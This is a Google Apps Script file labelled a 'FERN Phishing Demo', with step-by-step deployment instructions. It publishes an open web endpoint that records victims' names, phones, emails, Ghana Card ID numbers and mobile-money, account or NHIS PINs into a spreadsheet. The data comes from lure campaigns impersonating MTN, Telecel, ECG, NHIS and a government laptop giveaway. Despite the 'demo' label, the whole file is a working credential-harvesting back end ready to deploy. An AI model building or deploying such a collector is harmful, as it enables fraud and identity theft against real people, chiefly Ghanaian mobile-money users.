// ================================================================
//  FERN Phishing Demo - Google Apps Script
//  HOW TO USE:
//  1. Open your Google Sheet
//  2. Click Extensions -> Apps Script
//  3. Delete everything and paste this entire file
//  4. Click Save (floppy disk icon)
//  5. Click Deploy -> New Deployment
//  6. Type = Web App
//  7. Execute as = Me
//  8. Who has access = Anyone
//  9. Click Deploy -> Authorize -> Allow
//  10. Copy the Web App URL ending in /exec
//  11. Paste it into config.js
// ================================================================

var SHEET_ID = "1SbA9Oo2tT8b9BDXS0p5_opQGm4sBFLOjkU485RoVYBk";

function getSheet() {
  return SpreadsheetApp.openById(SHEET_ID).getActiveSheet();
}

function ensureHeaders(sheet) {
  if (sheet.getLastRow() === 0) {
    sheet.appendRow([
      "Timestamp", "Campaign", "Full Name", "Phone", "Email",
      "Ghana Card", "PIN / Password", "Field 1", "Field 2", "Field 3"
    ]);
    sheet.getRange(1, 1, 1, 10)
         .setFontWeight("bold")
         .setBackground("#1e293b")
         .setFontColor("#ffffff");
    sheet.setFrozenRows(1);
  }
}

function writeRow(data) {
  var sheet = getSheet();
  ensureHeaders(sheet);

  var row = [
    data.timestamp    || new Date().toLocaleString(),
    data.campaign     || "Unknown",
    data.fullname     || "",
    data.phone        || "",
    data.email        || "",
    data.ghana_card   || "",
    data.momo_pin     || data.account_pin || data.nhis_pin || data.pin || "",
    data.student_id   || data.meter_number || data.nhis_id || data.package || "",
    data.institution  || data.level || data.region || data.balance || "",
    data.network      || data.dob || ""
  ];

  sheet.appendRow(row);

  var colors = {
    "MTN Free Data":          "#fff8e1",
    "Government Free Laptop": "#f0faf4",
    "Telecel Free Bundle":    "#f9f0ff",
    "ECG Bill Waiver":        "#f0f7ff",
    "NHIS Free Renewal":      "#f0faf4"
  };
  var bg = colors[data.campaign] || "#ffffff";
  sheet.getRange(sheet.getLastRow(), 1, 1, row.length).setBackground(bg);
}

function doPost(e) {
  try {
    var data = {};
    if (e.postData && e.postData.type === "application/json") {
      data = JSON.parse(e.postData.contents);
    } else {
      data = e.parameter || {};
    }
    writeRow(data);
    return ContentService
      .createTextOutput(JSON.stringify({ status: "ok" }))
      .setMimeType(ContentService.MimeType.JSON);
  } catch (err) {
    return ContentService
      .createTextOutput(JSON.stringify({ status: "error", msg: err.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

function doGet(e) {
  try {
    var data = e.parameter || {};
    if (data.campaign) {
      writeRow(data);
      return ContentService
        .createTextOutput("OK")
        .setMimeType(ContentService.MimeType.TEXT);
    }
    return ContentService
      .createTextOutput("FERN Demo Backend - running ok")
      .setMimeType(ContentService.MimeType.TEXT);
  } catch (err) {
    return ContentService
      .createTextOutput("Error: " + err.toString())
      .setMimeType(ContentService.MimeType.TEXT);
  }
}

function testWrite() {
  writeRow({
    timestamp:  new Date().toLocaleString(),
    campaign:   "MTN Free Data",
    fullname:   "Kofi Test",
    phone:      "0244000000",
    email:      "kofi@test.com",
    ghana_card: "GHA-123456789-0",
    momo_pin:   "1234"
  });
}
